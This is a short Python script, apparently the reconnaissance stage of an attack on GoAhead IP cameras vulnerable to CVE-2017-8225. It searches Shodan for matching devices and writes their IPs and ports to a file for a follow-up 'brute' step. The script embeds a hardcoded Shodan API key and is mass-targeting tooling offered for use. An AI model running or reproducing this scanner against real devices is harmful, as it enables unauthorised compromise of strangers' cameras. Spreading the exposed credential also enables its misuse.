#!/usr/bin/python
# CVE-2017-8225
# After scanned, run the brute file
import requests, sys

if len(sys.argv) != 2:
    print("Correct usage: python3 " + sys.argv[0].split("\\").pop() + " <File Name>")
    sys.exit()

key = "69p4alCirDfLQGRBuXajWsJ3v3lJ9bE2"
url = "https://api.shodan.io/shodan/host/search?&query=GoAhead+5ccc069c403ebaf9f0171e9517f40e41&key=" + key
filename = sys.argv[1]

r =  requests.get(url)
data = r.json()
print("Cameras Found: " + str(len(data["matches"])) + "\n")
i = 0
with open(filename, "a+") as f:
    while(i < len(data["matches"])):
        camera = str(data["matches"][i]["ip_str"]) + ":" + str(data["matches"][i]["port"])
        f.write(camera + "\n")
        print(camera)
        i+=1

